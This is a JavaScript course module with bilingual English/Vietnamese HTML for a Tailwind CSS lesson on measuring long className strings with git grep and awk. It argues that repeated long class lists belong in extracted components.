import G04_1 from './giang/twc-04-1.mjs';
import G04_2 from './giang/twc-04-2.mjs';
import G04_3 from './giang/twc-04-3.mjs';
import G04_4 from './giang/twc-04-4.mjs';
import G04_5 from './giang/twc-04-5.mjs';
const REF = '?ref=%2Fcourses%2Ftailwind-css%2Flearn&reflabel=Tailwind%20CSS';
/**
 * Tailwind CSS — Chương 4: Component, và chỗ ĐÚNG để tái sử dụng.
 * Số đo (đo lại 14/11/2026): phân bố độ dài chuỗi lớp thật trong frontend/ (49.378 mẫu, 1.678 tệp .tsx),
 * 0 lượt dùng @apply (24.610 dòng CSS), 0 lượt dùng cva (147 tệp dùng bảng tra), 3 file primitives.tsx.
 */

export default {
  title: 'Chapter 4 — Components, and the right place to reuse|||Chương 4 — Component, và chỗ ĐÚNG để tái sử dụng',
  slug: 'tw-ch4-component',
  description: 'Lời phàn nàn "mã đánh dấu đầy lớp không đọc nổi" ĐO ĐƯỢC — và số đo cho thấy nó đúng với 3,1% trường hợp (đo 14/11/2026). Sáu bài về chỗ tái sử dụng thuộc về: component, không phải `@apply`.',
  sortOrder: 5,
  lessons: [

    /* ─────────────────────────── 4.1 ─────────────────────────── */
    {
      title: '4.1 — Measuring "class soup" instead of arguing about it|||4.1 — ĐO "canh lớp" thay vì cãi nhau về nó',
      slug: 'tw-4-1-do-canh-lop',
      type: 'VIDEO',
      description: 'Phân bố độ dài của 49.378 chuỗi lớp thật: 82% dưới 80 ký tự, và chỉ 3,1% vượt 160. Lời phàn nàn ĐÚNG — nhưng đúng với một thiểu số nhỏ, và chính thiểu số ấy chỉ ra chỗ cần tách component.',
      content: `
${G04_1}
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.1</span>
<h2>Measuring "class soup" instead of arguing about it</h2>
<p class="lead">"Utility classes make markup unreadable" is the most durable objection to this approach, and it is usually argued with a screenshot of a worst case. It is a claim about a distribution, so measure the distribution.</p>

<h3>The distribution</h3>
<pre><code class="language-bash">$ git grep -hoE 'className="[^"]*"' -- 'src/*.tsx' \\
  | awk '{n=length; if(n&lt;40)a++; else if(n&lt;80)b++; else if(n&lt;160)c++; else d++}
         END{printf "  &lt;40: %d\\n  40-79: %d\\n  80-159: %d\\n  160+: %d\\n",a,b,c,d}'
</code></pre>

<div class="out">$ git grep -hoE 'className="[^"]*"' -- 'src/*.tsx' | awk '{n=length; if(n&lt;40)a++; else if(n&lt;80)b++; else if(n&lt;160)c++; else d++; if(n&gt;m)m=n} END{t=a+b+c+d; printf "  &lt;40:    %5d (%4.1f%%)\\n  40-79:  %5d (%4.1f%%)\\n  80-159: %5d (%4.1f%%)\\n  160+:   %5d (%4.1f%%)\\n  tong %d chuoi · dai nhat %d ky tu\\n",a,100*a/t,b,100*b/t,c,100*c/t,d,100*d/t,t,m}'
  &lt;40:    21651 (43.8%)
  40-79:  18781 (38.0%)
  80-159:  7399 (15.0%)
  160+:    1547 ( 3.1%)
  tong 49378 chuoi · dai nhat 796 ky tu
# git grep tren frontend/ cua trang, 1.678 tep .tsx — 14/11/2026</div>

<p><strong>82% of class attributes in this application are under 80 characters</strong> — a single readable line. The horror cases exist: 1,547 attributes exceed 160 characters and one reaches 796. But they are 3.1% of the total, not the norm.</p>

<div class="callout ok">
<p><strong>Both sides of the argument are right about different data.</strong> The advocate saying "in practice it reads fine" is describing the 82%. The critic holding up a 796-character line is describing the 3.1%. Neither is lying. The useful question is not which experience is typical but <em>what the 3.1% have in common</em> — because that is where the actual design signal is.</p>
</div>

<h3>What a 796-character class attribute actually means</h3>
<p>Long class strings are not a Tailwind problem; they are a <em>missing abstraction</em> announcing itself. An element carrying forty utilities is doing several jobs at once:</p>

<pre><code class="language-jsx">&lt;div className="group relative flex flex-col items-start gap-3 rounded-2xl
  border border-darkborder bg-darkcard p-5 shadow-premium-card transition-all
  duration-300 hover:-translate-y-1 hover:border-neon-violet/40
  hover:shadow-premium-card-hover focus-within:ring-2 focus-within:ring-neon-violet/50
  sm:p-6 md:flex-row md:items-center md:gap-5"&gt;
</code></pre>

<p>Read it and the jobs separate cleanly: <em>layout</em> (flex, gap, direction), <em>surface</em> (border, background, radius, shadow), <em>interaction</em> (hover, focus-within, transition), <em>responsive</em> (sm:, md:). Four concerns on one element. In hand-written CSS these would be four rules with a shared selector, and you would have named the thing — <code>.premium-card</code> — which is exactly the abstraction that is missing here.</p>

<div class="lz-map">
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">short class list = leaf element</span><span class="lz-nsub">the 82%</span></span>
<span class="lz-nbody"><code>flex items-center gap-2</code>. One job, obvious at a glance, and abstracting it would cost more than it saves. Leave these alone — a component named <code>&lt;Row&gt;</code> that wraps three utilities is worse than the three utilities.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">long class list = missing component</span><span class="lz-nsub">the 3.1%</span></span>
<span class="lz-nbody">Forty utilities across four concerns. This element has an identity — it is a <em>card</em>, a <em>panel</em>, a <em>toolbar</em> — and the identity has no name yet. The fix is to name it, and naming it in JSX is a component.</span>
</div>
</div>

<h3>The threshold that is worth a rule</h3>
<p>Any threshold is arbitrary, but having one beats arguing case by case. From the distribution, a reasonable line is <strong>repetition, not length</strong>:</p>

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">long and used ONCE</span><span class="lz-lnote">leave it. A one-off hero section with forty utilities is fine — extracting a component used in one place adds indirection and removes nothing. Length alone is not the problem</span></div>
<div class="lz-layer"><span class="lz-lname">long and used 2-3 times</span><span class="lz-lnote">judgement. If the copies are already drifting from each other, extract now; drift is the signal that the concept is real and unnamed</span></div>
<div class="lz-layer"><span class="lz-lname">long and used 4+ times</span><span class="lz-lnote">extract. At this point you have a design-system component with no name, and every future change means finding all four copies. Same rule as the scale in lesson 1.2 — count, then name</span></div>
<div class="lz-layer"><span class="lz-lname">short but used everywhere</span><span class="lz-lnote">leave it. <code>flex items-center gap-2</code> appears thousands of times and should. Frequency does not imply an abstraction is missing; the combination has no identity worth naming</span></div>
</div>

<h3>Finding the candidates mechanically</h3>
<p>Repeated long strings are exactly what a shell pipeline is good at:</p>

<pre><code class="language-bash"># chuoi lop dai xuat hien nhieu lan = ung vien tach component
$ git grep -hoE 'className="[^"]{120,}"' -- 'src/*.tsx' \\
  | sort | uniq -c | sort -rn | head -10
</code></pre>

<p>Anything appearing three or more times with 120+ characters is a component waiting to be named. This is a better starting point than reading files, because it ranks by the thing that actually costs you — duplication that must be kept in sync by hand.</p>

<div class="callout warn">
<p><strong>The cost of not extracting, stated concretely.</strong> Four copies of a 200-character class list means a design change touches four files, and a reviewer must diff four nearly-identical strings to confirm they still match. That is precisely the failure the pre-Tailwind world used CSS classes to avoid — and it is the one legitimate thing the critics are pointing at. The answer is not to abandon utilities; it is to extract a component — lessons 4.3 to 4.5 (lesson 4.2 first measures why <code>@apply</code> is not that answer).</p>
</div>

<div class="pitfall">
<p><strong>Trap — treating line length as the metric.</strong> Some teams add a lint rule capping class-attribute length. It produces two bad outcomes: genuine one-off layouts get split into meaningless sub-components to satisfy the linter, and people work around it by moving classes into variables, which hides the length without removing the duplication. The metric that matters is <em>how many places must change together</em>, and no character count measures that.</p>
</div>

<div class="callout">
<p><strong>One sentence.</strong> "Class soup" is a real phenomenon at 3.1% of this codebase and a non-issue at 82%, so stop arguing about typicality and use the long strings as a <em>signal</em> — a class list that is both long and repeated is a component whose name has not been written down yet.</p>
</div>

<h3>🔬 Measured: the candidates, and one input written 28 ways</h3>
<div class="out">$ git grep -hoE 'className="[^"]{120,}"' -- 'src/*.tsx' | sort | uniq -c | sort -rn | head -4 | cut -c1-118
  12 className="w-full px-4 py-2.5 bg-darkbg border border-darkborder rounded-xl text-sm text-text-primary placeholder
  12 className="w-full px-4 py-2.5 bg-darkbg border border-darkborder rounded-xl text-sm text-text-primary focus:outli
  11 className="flex w-full items-center gap-2 px-3 py-2 text-left text-xs text-text-secondary transition-colors hover
   9 className="inline-flex items-center gap-2 px-6 py-3 bg-gradient-to-r from-neon-indigo to-neon-violet text-white f
$ git grep -hoE 'className="[^"]{120,}"' -- 'src/*.tsx' | sort | uniq -c | awk '$1&gt;=4{n++; s+=$1} $1&gt;=2{m++} END{print n " chuoi dai &gt;=120 lap &gt;=4 lan (" s " luot) · " m " chuoi dai lap &gt;=2 lan"}'
31 chuoi dai &gt;=120 lap &gt;=4 lan (172 luot) · 234 chuoi dai lap &gt;=2 lan</div>
<p>31 strings of 120+ characters appear four or more times — 172 uses. The top two rows are the <em>same input</em>, twelve copies each, one with <code>placeholder:text-text-muted</code> and one without, so exact-match counting splits the family. Counting the whole family (every <code>className</code> with <code>w-full</code>, <code>px-4 py-2.5</code>, a border, <code>rounded-xl</code> and the violet focus border):</p>
<div class="out">$ node troi.cjs
71 luot, 28 cach viet khac nhau
 12 x (cach viet goc)
 12 x +placeholder:text-text-muted
  6 x +bg-darkcard +placeholder:text-text-muted +transition-colors -bg-darkbg
  5 x +cursor-pointer
  5 x +placeholder:text-text-muted +transition-colors
  4 x +placeholder:text-text-muted +resize-y
$ git -C ../kho grep -lE 'className="[^"]*px-4 py-2\\.5[^"]*focus:border-neon-violet[^"]*"' -- 'src/*.tsx' | wc -l
      16
$ git -C ../kho grep -c 'TextInput' -- 'src/*.tsx' | wc -l
       5</div>
<p><strong>71 uses, 28 different strings, 16 files</strong> — while the site's themed <code>TextInput</code> (in <code>settings/primitives.tsx</code>) is mentioned in only 5 files. Some differences are deliberate (<code>resize-y</code> on a textarea); others are accidents. Rendered in Chromium with this site's real <code>tailwind.config.ts</code>:</p>
<table><tr><th>spelling (copies)</th><th>placeholder colour</th><th>background</th></tr>
<tr><td>most common (12×)</td><td><code>rgb(138, 141, 145)</code></td><td><code>rgb(24, 25, 26)</code></td></tr>
<tr><td>no <code>placeholder:</code> class (12×)</td><td><code>rgb(156, 163, 175)</code> — preflight grey</td><td><code>rgb(24, 25, 26)</code></td></tr>
<tr><td><code>bg-darkcard</code> (6×)</td><td><code>rgb(138, 141, 145)</code></td><td><code>rgb(36, 37, 38)</code> — lighter</td></tr></table>
<p>Three "identical" inputs, three looks — small enough to pass review, visible to anyone moving between pages. That is <em>drift</em>, and it is the strongest version of the extraction signal: a real concept with no name.</p>
<h3>🔬 Measured: what the soup does NOT cost</h3>
<div class="out">$ wc -c mot.html muoihai.html a.css b.css
     204 mot.html
    2448 muoihai.html
     727 a.css
     727 b.css
    4106 total
$ cmp a.css b.css &amp;&amp; echo "a.css va b.css GIONG HET tung byte"
a.css va b.css GIONG HET tung byte
$ echo "gzip: mot.html $(gzip -c mot.html | wc -c) B · muoihai.html $(gzip -c muoihai.html | wc -c) B"
gzip: mot.html      176 B · muoihai.html      201 B</div>
<p>One copy or twelve copies of the long string: the stylesheet is the same 727 bytes, byte for byte, because Tailwind generates each class once. The HTML grows twelvefold but gzip squeezes the repetition. The real cost is <strong>places that must change together</strong>: rebranding that focus colour is 71 edits in 16 files, and a search for one spelling misses most of them.</p>
<h3>🌍 In real life, "what if…", and the attacker's view</h3>
<ul><li><strong>Every day:</strong> a recipe written once on the menu is fine; the same recipe photocopied onto twelve order slips and corrected by hand on each one soon means nobody knows which version the kitchen follows. That is drift.</li>
<li><strong>What if…</strong> the designer changes the focus ring to cyan? Someone searches for one spelling, fixes the files it finds, and ships. The missed pages keep the old colour; the bug report says "inconsistent", not "broken", so it survives for months.</li>
<li><strong>The attacker's view:</strong> with utilities, a page's whole appearance travels inside its markup. A phishing page can clone your login form by copying its HTML and your public stylesheet — pixel-perfect, no design work. Appearance proves nothing: users must check the <strong>domain</strong>, and the site should use passkeys or two-factor authentication so a stolen password alone is not enough.</li></ul>
<h3>🔁 Run it yourself</h3>
<pre><code class="language-bash"><span class="tok-comment"># in your own project (git repo): the distribution</span>
git grep -hoE 'className="[^"]*"' -- '*.tsx' | awk '{n=length; if(n&lt;80)s++; t++} END{print s*100/t "% under 80 chars"}'
<span class="tok-comment"># long AND repeated = your component backlog</span>
git grep -hoE 'className="[^"]{120,}"' -- '*.tsx' | sort | uniq -c | sort -rn | head -5
<span class="tok-comment"># does repetition cost CSS bytes? build one copy and twelve copies, compare</span>
npx tailwindcss --content ./one.html -o a.css --minify &amp;&amp; npx tailwindcss --content ./twelve.html -o b.css --minify &amp;&amp; cmp a.css b.css &amp;&amp; echo same</code></pre>
<h3>🔗 Go deeper in other courses</h3>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-1-4-chia-nho" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 1.4 — Thinking in components</span><span class="lc-sub">From a mock-up to a component tree: where the names come from</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-13-2-hook-styling" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 13.2 — Good custom hooks, and styling</span><span class="lc-sub">CSS Modules or Tailwind — the same trade-off from the React side</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-4-2-apply" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 4.2 — Why @apply undoes the thing that made it worth it</span><span class="lc-sub">Next lesson: the "obvious" fix, measured</span></span></a>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Class soup</span><span class="v">The objection that long utility strings make markup unreadable — real for 3.1% here, not for the 82%.</span></div>
  <div class="kv"><span class="k">Distribution</span><span class="v">Measuring every class attribute's length instead of arguing from one worst-case screenshot.</span></div>
  <div class="kv"><span class="k">Missing abstraction</span><span class="v">A long class list doing four jobs (layout, surface, interaction, responsive) that has an identity but no name.</span></div>
  <div class="kv"><span class="k">Repetition over length</span><span class="v">The real extraction signal: how many places must change together, not character count.</span></div>
  <div class="kv"><span class="k">Extraction threshold</span><span class="v">Long and used 4+ times → extract; used once → leave it, length alone is not the problem.</span></div>
  <div class="kv"><span class="k">Leaf element</span><span class="v">A short one-job list like <code>flex items-center gap-2</code> — wrapping it in a component costs more than it saves.</span></div>
</div>

<h3>📌 Summary</h3>
<ul><li>Measured: 82% of class attributes are under 80 characters; only 3.1% exceed 160 (longest 796).</li><li>A class list that is both long and repeated is a component whose name has not been written down.</li><li>Extract on repetition (4+ uses), not on length — a one-off long list is fine.</li><li><code>grep | sort | uniq -c | sort -rn</code> ranks candidates by the duplication that actually costs you.</li></ul>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Tailwind docs — Reusing styles</span><span class="lc-sub">tailwindcss.com/docs/styling-with-utility-classes#managing-duplication — the official position: extract components, use editor multi-cursor, and avoid premature abstraction.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Adam Wathan — CSS Utility Classes and "Separation of Concerns"</span><span class="lc-sub">adamwathan.me/css-utility-classes-and-separation-of-concerns — the essay that argued the case before Tailwind existed, including the honest account of when the approach breaks down.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Sandi Metz — The Wrong Abstraction</span><span class="lc-sub">sandimetz.com/blog/2016/1/20/the-wrong-abstraction — why extracting too early is worse than duplication, which is the reasoning behind the "used 4+ times" threshold above.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Next.js — component boundaries in an App Router codebase</span><span class="lc-sub">/courses/nextjs/learn${REF} — where a component boundary can go, and why server/client boundaries sometimes force the extraction decision for you.</span></span></div>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.1</span>
<h2>ĐO "canh lớp" thay vì cãi nhau về nó</h2>
<p class="lead">"Lớp tiện ích làm mã đánh dấu không đọc nổi" là lời phản đối BỀN BỈ nhất với cách làm này, và người ta thường tranh luận nó bằng một ảnh chụp một ca TỆ NHẤT. Đó là một khẳng định về PHÂN BỐ, nên hãy ĐO cái phân bố.</p>

<h3>Phân bố</h3>
<pre><code class="language-bash">$ git grep -hoE 'className="[^"]*"' -- 'src/*.tsx' \\
  | awk '{n=length; if(n&lt;40)a++; else if(n&lt;80)b++; else if(n&lt;160)c++; else d++}
         END{printf "  &lt;40: %d\\n  40-79: %d\\n  80-159: %d\\n  160+: %d\\n",a,b,c,d}'
</code></pre>

<div class="out">$ git grep -hoE 'className="[^"]*"' -- 'src/*.tsx' | awk '{n=length; if(n&lt;40)a++; else if(n&lt;80)b++; else if(n&lt;160)c++; else d++; if(n&gt;m)m=n} END{t=a+b+c+d; printf "  &lt;40:    %5d (%4.1f%%)\\n  40-79:  %5d (%4.1f%%)\\n  80-159: %5d (%4.1f%%)\\n  160+:   %5d (%4.1f%%)\\n  tong %d chuoi · dai nhat %d ky tu\\n",a,100*a/t,b,100*b/t,c,100*c/t,d,100*d/t,t,m}'
  &lt;40:    21651 (43.8%)
  40-79:  18781 (38.0%)
  80-159:  7399 (15.0%)
  160+:    1547 ( 3.1%)
  tong 49378 chuoi · dai nhat 796 ky tu
# git grep tren frontend/ cua trang, 1.678 tep .tsx — 14/11/2026</div>

<p><strong>82% thuộc tính lớp trong ứng dụng này dưới 80 ký tự</strong> — một dòng đọc được. Các ca kinh dị CÓ tồn tại: 1.547 thuộc tính vượt 160 ký tự và một cái chạm 796. Nhưng chúng là 3,1% tổng số, không phải cái thường lệ.</p>

<div class="callout ok">
<p><strong>CẢ HAI phe đều đúng về những dữ liệu KHÁC NHAU.</strong> Người ủng hộ nói "trong thực tế nó đọc ổn" đang mô tả 82%. Người phê bình giơ lên một dòng 796 ký tự đang mô tả 3,1%. Không ai nói dối. Câu hỏi HỮU ÍCH không phải trải nghiệm nào là điển hình mà là <em>3,1% ấy có ĐIỂM CHUNG gì</em> — vì đó mới là chỗ có tín hiệu thiết kế thật.</p>
</div>

<h3>Một thuộc tính lớp 796 ký tự THẬT SỰ nghĩa là gì</h3>
<p>Chuỗi lớp dài KHÔNG phải một vấn đề của Tailwind; chúng là một <em>SỰ TRỪU TƯỢNG CÒN THIẾU</em> đang tự thông báo. Một thẻ mang bốn mươi tiện ích đang làm NHIỀU việc cùng lúc:</p>

<pre><code class="language-jsx">&lt;div className="group relative flex flex-col items-start gap-3 rounded-2xl
  border border-darkborder bg-darkcard p-5 shadow-premium-card transition-all
  duration-300 hover:-translate-y-1 hover:border-neon-violet/40
  hover:shadow-premium-card-hover focus-within:ring-2 focus-within:ring-neon-violet/50
  sm:p-6 md:flex-row md:items-center md:gap-5"&gt;
</code></pre>

<p>Đọc nó thì các việc TÁCH RA rất sạch: <em>bố cục</em> (flex, gap, hướng), <em>bề mặt</em> (viền, nền, bo góc, bóng), <em>tương tác</em> (hover, focus-within, transition), <em>responsive</em> (sm:, md:). BỐN mối quan tâm trên một thẻ. Trong CSS viết tay đây sẽ là bốn quy tắc dùng chung một selector, và bạn sẽ ĐÃ ĐẶT TÊN cho cái thứ ấy — <code>.premium-card</code> — chính là sự trừu tượng đang thiếu ở đây.</p>

<div class="lz-map">
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">danh sách lớp NGẮN = thẻ lá</span><span class="lz-nsub">82%</span></span>
<span class="lz-nbody"><code>flex items-center gap-2</code>. MỘT việc, hiển nhiên trong một cái liếc, và trừu tượng hoá nó sẽ TỐN hơn cái nó tiết kiệm. Hãy để yên — một component tên <code>&lt;Row&gt;</code> bọc ba tiện ích thì TỆ HƠN ba tiện ích ấy.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">danh sách lớp DÀI = component còn thiếu</span><span class="lz-nsub">3,1%</span></span>
<span class="lz-nbody">Bốn mươi tiện ích trải bốn mối quan tâm. Thẻ này có một CĂN CƯỚC — nó là một <em>thẻ card</em>, một <em>bảng</em>, một <em>thanh công cụ</em> — và căn cước ấy CHƯA có tên. Cú vá là ĐẶT TÊN cho nó, và đặt tên trong JSX nghĩa là một COMPONENT.</span>
</div>
</div>

<h3>Cái ngưỡng đáng thành một luật</h3>
<p>Mọi ngưỡng đều tuỳ tiện, nhưng CÓ một cái vẫn hơn cãi nhau từng ca. Từ phân bố ấy, một ranh giới hợp lý là <strong>SỰ LẶP LẠI, không phải ĐỘ DÀI</strong>:</p>

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">dài và dùng MỘT lần</span><span class="lz-lnote">để yên. Một mục hero một-lần với bốn mươi tiện ích thì ổn — tách một component dùng ở một chỗ thì thêm một lớp gián tiếp và không gỡ được gì. ĐỘ DÀI một mình KHÔNG phải vấn đề</span></div>
<div class="lz-layer"><span class="lz-lname">dài và dùng 2-3 lần</span><span class="lz-lnote">tuỳ phán đoán. Nếu các bản sao ĐÃ bắt đầu trôi khỏi nhau, hãy tách NGAY; sự trôi dạt là tín hiệu rằng khái niệm ấy CÓ THẬT và chưa có tên</span></div>
<div class="lz-layer"><span class="lz-lname">dài và dùng 4+ lần</span><span class="lz-lnote">TÁCH. Tới đây bạn có một component hệ-thiết-kế không tên, và mọi thay đổi tương lai nghĩa là đi tìm cả bốn bản sao. Cùng luật với cái thang ở bài 1.2 — ĐẾM, rồi ĐẶT TÊN</span></div>
<div class="lz-layer"><span class="lz-lname">ngắn nhưng dùng khắp nơi</span><span class="lz-lnote">để yên. <code>flex items-center gap-2</code> xuất hiện hàng nghìn lần và NÊN thế. TẦN SUẤT không hàm ý thiếu một trừu tượng; tổ hợp ấy không có căn cước nào đáng đặt tên</span></div>
</div>

<h3>Tìm ứng viên bằng MÁY</h3>
<p>Các chuỗi dài LẶP LẠI đúng là thứ một đường ống shell làm tốt:</p>

<pre><code class="language-bash"># chuoi lop dai xuat hien nhieu lan = ung vien tach component
$ git grep -hoE 'className="[^"]{120,}"' -- 'src/*.tsx' \\
  | sort | uniq -c | sort -rn | head -10
</code></pre>

<p>Bất cứ thứ gì xuất hiện từ ba lần trở lên với 120+ ký tự là một component đang chờ được đặt tên. Đây là điểm khởi đầu TỐT HƠN việc đọc file, vì nó XẾP HẠNG theo đúng cái thật sự làm bạn tốn kém — sự trùng lặp phải giữ đồng bộ bằng tay.</p>

<div class="callout warn">
<p><strong>Cái giá của việc KHÔNG tách, nói cho cụ thể.</strong> Bốn bản sao của một danh sách lớp 200 ký tự nghĩa là một thay đổi thiết kế động vào bốn file, và người review phải diff bốn chuỗi gần-như-giống-hệt để xác nhận chúng còn khớp. Đó CHÍNH XÁC là cú hỏng mà thế giới trước-Tailwind dùng lớp CSS để tránh — và nó là điều CHÍNH ĐÁNG duy nhất mà những người phê bình đang chỉ vào. Câu trả lời KHÔNG phải bỏ tiện ích; nó là TÁCH một component — bài 4.3 tới 4.5 (bài 4.2 đo trước vì sao <code>@apply</code> KHÔNG phải câu trả lời ấy).</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — lấy ĐỘ DÀI DÒNG làm thước đo.</strong> Vài đội thêm một luật lint chặn độ dài thuộc tính lớp. Nó đẻ ra hai kết cục xấu: các bố cục một-lần chính đáng bị chẻ thành những component con VÔ NGHĨA để làm hài lòng bộ lint, và người ta lách bằng cách dời lớp vào biến, thứ GIẤU độ dài mà không gỡ sự trùng lặp. Thước đo QUAN TRỌNG là <em>bao nhiêu chỗ phải đổi CÙNG NHAU</em>, và không phép đếm ký tự nào đo được cái đó.</p>
</div>

<div class="callout">
<p><strong>Một câu.</strong> "Canh lớp" là một hiện tượng CÓ THẬT ở 3,1% kho mã này và là chuyện KHÔNG ĐÁNG BÀN ở 82%, nên hãy thôi cãi nhau về cái gì là điển hình và dùng các chuỗi dài như một <em>TÍN HIỆU</em> — một danh sách lớp vừa DÀI vừa LẶP LẠI là một component mà cái tên của nó chưa được viết ra.</p>
</div>

<h3>🔬 Đo thật: các ứng viên, và một ô nhập viết 28 kiểu</h3>
<div class="out">$ git grep -hoE 'className="[^"]{120,}"' -- 'src/*.tsx' | sort | uniq -c | sort -rn | head -4 | cut -c1-118
  12 className="w-full px-4 py-2.5 bg-darkbg border border-darkborder rounded-xl text-sm text-text-primary placeholder
  12 className="w-full px-4 py-2.5 bg-darkbg border border-darkborder rounded-xl text-sm text-text-primary focus:outli
  11 className="flex w-full items-center gap-2 px-3 py-2 text-left text-xs text-text-secondary transition-colors hover
   9 className="inline-flex items-center gap-2 px-6 py-3 bg-gradient-to-r from-neon-indigo to-neon-violet text-white f
$ git grep -hoE 'className="[^"]{120,}"' -- 'src/*.tsx' | sort | uniq -c | awk '$1&gt;=4{n++; s+=$1} $1&gt;=2{m++} END{print n " chuoi dai &gt;=120 lap &gt;=4 lan (" s " luot) · " m " chuoi dai lap &gt;=2 lan"}'
31 chuoi dai &gt;=120 lap &gt;=4 lan (172 luot) · 234 chuoi dai lap &gt;=2 lan</div>
<p>31 chuỗi dài từ 120 ký tự xuất hiện từ bốn lần trở lên — 172 lượt. Hai dòng đầu là <em>cùng một ô nhập</em>, mỗi bản 12 lần, một bản có <code>placeholder:text-text-muted</code>, một bản không — nên đếm khớp chính xác đã tách đôi cả họ. Đếm cả họ (mọi <code>className</code> có <code>w-full</code>, <code>px-4 py-2.5</code>, viền, <code>rounded-xl</code> và viền focus tím):</p>
<div class="out">$ node troi.cjs
71 luot, 28 cach viet khac nhau
 12 x (cach viet goc)
 12 x +placeholder:text-text-muted
  6 x +bg-darkcard +placeholder:text-text-muted +transition-colors -bg-darkbg
  5 x +cursor-pointer
  5 x +placeholder:text-text-muted +transition-colors
  4 x +placeholder:text-text-muted +resize-y
$ git -C ../kho grep -lE 'className="[^"]*px-4 py-2\\.5[^"]*focus:border-neon-violet[^"]*"' -- 'src/*.tsx' | wc -l
      16
$ git -C ../kho grep -c 'TextInput' -- 'src/*.tsx' | wc -l
       5</div>
<p><strong>71 lượt, 28 chuỗi khác nhau, 16 tệp</strong> — trong khi <code>TextInput</code> đã theo theme của trang (trong <code>settings/primitives.tsx</code>) chỉ được 5 tệp nhắc tới. Có khác biệt cố ý (<code>resize-y</code> trên ô soạn thảo); có khác biệt do tai nạn. Dựng trong Chromium bằng <code>tailwind.config.ts</code> thật của trang:</p>
<table><tr><th>cách viết (số bản)</th><th>màu placeholder</th><th>nền</th></tr>
<tr><td>phổ biến nhất (12×)</td><td><code>rgb(138, 141, 145)</code></td><td><code>rgb(24, 25, 26)</code></td></tr>
<tr><td>thiếu lớp <code>placeholder:</code> (12×)</td><td><code>rgb(156, 163, 175)</code> — xám của preflight</td><td><code>rgb(24, 25, 26)</code></td></tr>
<tr><td><code>bg-darkcard</code> (6×)</td><td><code>rgb(138, 141, 145)</code></td><td><code>rgb(36, 37, 38)</code> — sáng hơn</td></tr></table>
<p>Ba ô nhập "giống nhau", ba vẻ ngoài — đủ nhỏ để lọt qua review, đủ rõ để ai đi qua các trang đều thấy. Đó là <em>trôi</em>, dạng mạnh nhất của tín hiệu tách: một khái niệm có thật mà chưa có tên.</p>
<h3>🔬 Đo thật: canh lớp KHÔNG tốn gì</h3>
<div class="out">$ wc -c mot.html muoihai.html a.css b.css
     204 mot.html
    2448 muoihai.html
     727 a.css
     727 b.css
    4106 total
$ cmp a.css b.css &amp;&amp; echo "a.css va b.css GIONG HET tung byte"
a.css va b.css GIONG HET tung byte
$ echo "gzip: mot.html $(gzip -c mot.html | wc -c) B · muoihai.html $(gzip -c muoihai.html | wc -c) B"
gzip: mot.html      176 B · muoihai.html      201 B</div>
<p>Một bản hay mười hai bản của chuỗi dài: bảng kiểu vẫn 727 byte, giống hệt từng byte, vì Tailwind chỉ sinh mỗi lớp một lần. HTML lớn gấp mười hai nhưng gzip nén gần hết phần lặp. Giá thật là <strong>số chỗ phải đổi cùng nhau</strong>: đổi màu viền focus là 71 chỗ sửa trong 16 tệp, và tìm theo một cách viết sẽ sót phần lớn.</p>
<h3>🌍 Ngoài đời, "nếu… thì sao", và góc kẻ xấu</h3>
<ul><li><strong>Ngoài đời:</strong> công thức món ăn viết một lần trên thực đơn thì ổn; chép lên mười hai tờ phiếu rồi mỗi tờ sửa tay một chút thì ít lâu sau không ai biết bếp đang theo bản nào. Đó là trôi.</li>
<li><strong>Nếu… thì sao:</strong> nhà thiết kế đổi viền focus sang xanh lơ? Ai đó tìm theo một cách viết, sửa các tệp tìm thấy, rồi phát hành. Trang bị sót giữ màu cũ; báo lỗi ghi "không đồng nhất" chứ không phải "hỏng", nên lỗi sống hàng tháng.</li>
<li><strong>Góc kẻ xấu:</strong> với lớp tiện ích, toàn bộ vẻ ngoài của trang nằm ngay trong mã đánh dấu. Trang lừa đảo chép form đăng nhập của bạn chỉ bằng cách chép HTML và bảng kiểu công khai — giống từng pixel, không cần thiết kế. Vẻ ngoài không chứng minh gì: người dùng phải nhìn <strong>tên miền</strong>, và trang nên dùng passkey hoặc xác thực hai lớp để mật khẩu bị lộ thôi là chưa đủ.</li></ul>
<h3>🔁 Tự chạy lại</h3>
<pre><code class="language-bash"><span class="tok-comment"># trong dự án của bạn (kho git): phân bố</span>
git grep -hoE 'className="[^"]*"' -- '*.tsx' | awk '{n=length; if(n&lt;80)s++; t++} END{print s*100/t "% under 80 chars"}'
<span class="tok-comment"># dài VÀ lặp = danh sách component đang chờ tên</span>
git grep -hoE 'className="[^"]{120,}"' -- '*.tsx' | sort | uniq -c | sort -rn | head -5
<span class="tok-comment"># lặp có tốn byte CSS không? dựng một bản và mười hai bản, so</span>
npx tailwindcss --content ./one.html -o a.css --minify &amp;&amp; npx tailwindcss --content ./twelve.html -o b.css --minify &amp;&amp; cmp a.css b.css &amp;&amp; echo same</code></pre>
<h3>🔗 Học sâu hơn ở khoá khác</h3>
